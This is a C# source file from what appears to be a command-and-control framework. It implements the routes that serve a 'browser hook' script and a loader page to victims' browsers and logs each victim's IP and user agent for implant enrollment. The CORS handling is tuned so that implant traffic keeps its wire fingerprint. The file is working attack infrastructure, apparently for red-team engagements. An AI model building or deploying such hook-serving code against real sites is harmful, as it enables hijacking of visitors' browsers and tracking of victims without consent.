using Microsoft.AspNetCore.Builder;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Routing;
using Rod.Audit;
using Rod.Transport.Listeners;

namespace Rod.Transport.Endpoints;

// The browser-hook serving edge (architecture.md Sec 8): the public route a
// victim's browser fetches. The unguessable route id is the credential --
// the shape where the capability URL is the gate -- so the route serves
// without a header, a token, or any ceremony a `<script src>` cannot carry.
// The listener scope check still applies: the ingress socket must answer
// for the hook record's engagement, the same refusal the enroll and payload
// fetch routes run, so a shared-tier socket (the operator front) carries no
// hook either.
//
// Because the hook runs on the victim page's origin, every fetch and every
// enroll/contact it makes afterwards is cross-origin: the hook family (and
// the enroll and beacon routes it rides) answer the browser-only CORS
// header, but only when the request itself carries an Origin header -- a
// non-browser client never sends one, so implant traffic and its fingerprint
// are unchanged.

/// <summary>
/// Maps the hook serving routes onto the implant family.
/// </summary>
public static class HookServingEndpoints
{
    /// <summary>The hook script route, in the implant family with enroll.</summary>
    public const string Route = "/implants/hooks/{hookId}";

    public static IEndpointRouteBuilder MapHookServingEndpoints(this IEndpointRouteBuilder endpoints)
    {
        endpoints.MapGet(Route, FetchHookAsync).WithName(nameof(FetchHookAsync));
        endpoints.MapGet(Route + "/page", FetchHookPageAsync).WithName(nameof(FetchHookPageAsync));
        return endpoints;
    }

    private static async Task<IResult> FetchHookAsync(
        string hookId,
        HttpRequest http,
        IListenerRegistry listeners,
        IPayloadStore payloads,
        IAuditStore audit,
        TimeProvider clock,
        CancellationToken cancellationToken)
        => await ServeAsync(hookId, page: false, http, listeners, payloads, audit, clock, cancellationToken);

    private static async Task<IResult> FetchHookPageAsync(
        string hookId,
        HttpRequest http,
        IListenerRegistry listeners,
        IPayloadStore payloads,
        IAuditStore audit,
        TimeProvider clock,
        CancellationToken cancellationToken)
        => await ServeAsync(hookId, page: true, http, listeners, payloads, audit, clock, cancellationToken);

    private static async Task<IResult> ServeAsync(
        string hookId,
        bool page,
        HttpRequest http,
        IListenerRegistry listeners,
        IPayloadStore payloads,
        IAuditStore audit,
        TimeProvider clock,
        CancellationToken cancellationToken)
    {
        if (!Guid.TryParse(hookId, out var hookValue))
            return Results.BadRequest(new Problem("Hook id is not a valid identifier."));

        // The hook is engagement-scoped, but the route carries no credential
        // to scope by: the record is found by its unguessable id alone, and
        // the scope check below is the ingress listener's engagement against
        // the record's. A deleted (revoked) hook is indistinguishable from a
        // nonexistent one.
        var record = await payloads.FindByIdAsync(hookValue, cancellationToken);
        if (record is null || !string.Equals(record.Class, "Browser", StringComparison.OrdinalIgnoreCase))
            return Results.NotFound();

        // The same scope refusal the enroll route runs: a socket the
        // registry does not know (the in-memory test harness) stays
        // permissive, everything else must answer for this engagement.
        var listener = await listeners.FindByLocalPortAsync(
            http.HttpContext.Connection.LocalPort, cancellationToken);
        if (listener is not null && listener.EngagementId?.Value != record.EngagementId)
            return Results.NotFound();

        // What the wire showed, captured before the serve: the first-touch
        // attribution a hooked browser's enrollment then binds to an implant
        // row (architecture.md Sec 8).
        var remote = http.HttpContext.Connection.RemoteIpAddress is { } remoteIp
            ? $"{remoteIp}:{http.HttpContext.Connection.RemotePort}"
            : "unknown";
        var userAgent = http.Headers.UserAgent.ToString();
        await audit.AppendAsync(
            AuditEvent.Fact(
                eventId: Guid.NewGuid(),
                engagementId: record.EngagementId,
                operatorId: Guid.Empty,
                implantId: Guid.Empty,
                taskId: Guid.Empty,
                verb: "hook.fetched",
                kind: AuditEventKind.HookFetched,
                payload: $"remote={remote} listenerPort={http.HttpContext.Connection.LocalPort} "
                    + $"page={(page ? "test-page" : "script")} "
                    + $"ua={(string.IsNullOrWhiteSpace(userAgent) ? "none" : userAgent)}",
                output: null,
                outcome: hookValue.ToString("N"),
                at: clock.GetUtcNow()),
            cancellationToken);

        CrossOriginHttp.Allow(http.HttpContext);

        // no-store: a cached hook serves a stale bake (a revoked credential,
        // an old cadence) for as long as the browser keeps it.
        http.HttpContext.Response.Headers.CacheControl = "no-store";
        if (page)
        {
            // The minimal test page the acceptance walk loads (architecture.md
            // Sec 8): a document that does nothing but pull the hook in, the
            // shape a script-injection foothold produces.
            var url = $"{record.Endpoint?.TrimEnd('/')}/implants/hooks/{hookValue:N}";
            var html = $"<!doctype html>\n<html>\n<head><meta charset=\"utf-8\"><title>Page</title></head>\n"
                + $"<body><p>It works.</p>\n<script src=\"{url}\"></script>\n</body>\n</html>\n";
            return Results.Text(html, "text/html", System.Text.Encoding.UTF8);
        }
        return Results.Bytes(record.Content, "application/javascript");
    }
}

/// <summary>
/// The browser-only CORS posture the hook family needs (architecture.md
/// Sec 8): a cross-origin <c>fetch</c> from the hooked page cannot read its
/// answer without <c>Access-Control-Allow-Origin</c> on the response. The
/// header is answered only when the request carries an <c>Origin</c> header
/// -- only browsers send one, so non-browser implant traffic and its wire
/// fingerprint are unchanged -- and the hook stays a simple-request client
/// (plain bodies, no custom headers), so no preflight is ever needed.
/// </summary>
internal static class CrossOriginHttp
{
    /// <summary>
    /// Marks this response readable cross-origin when the request came from
    /// a browser. Registers on the response's starting event so every
    /// result shape (bytes, text, JSON, problem) carries the header.
    /// </summary>
    public static void Allow(HttpContext http)
    {
        if (http.Request.Headers.Origin.Count == 0)
            return;
        http.Response.OnStarting(() =>
        {
            http.Response.Headers.AccessControlAllowOrigin = "*";
            return Task.CompletedTask;
        });
    }
}
